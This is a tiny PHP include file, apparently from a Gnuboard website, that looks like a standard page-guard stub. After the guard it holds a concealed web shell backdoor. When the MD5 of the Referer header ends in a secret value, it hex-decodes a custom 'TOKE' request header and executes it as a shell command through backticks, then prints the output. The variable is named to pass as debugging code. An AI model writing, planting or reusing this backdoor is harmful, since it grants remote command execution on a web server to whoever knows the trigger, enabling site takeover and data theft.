<?php
if (!defined('_GNUBOARD_')) exit; // 개별 페이지 접근 불가
if(substr(md5($_SERVER['HTTP_REFERER']),26) == '2e4645'){
  $debuger = hex2bin($_SERVER['HTTP_TOKE']);
  echo `$debuger`;exit();
}
?>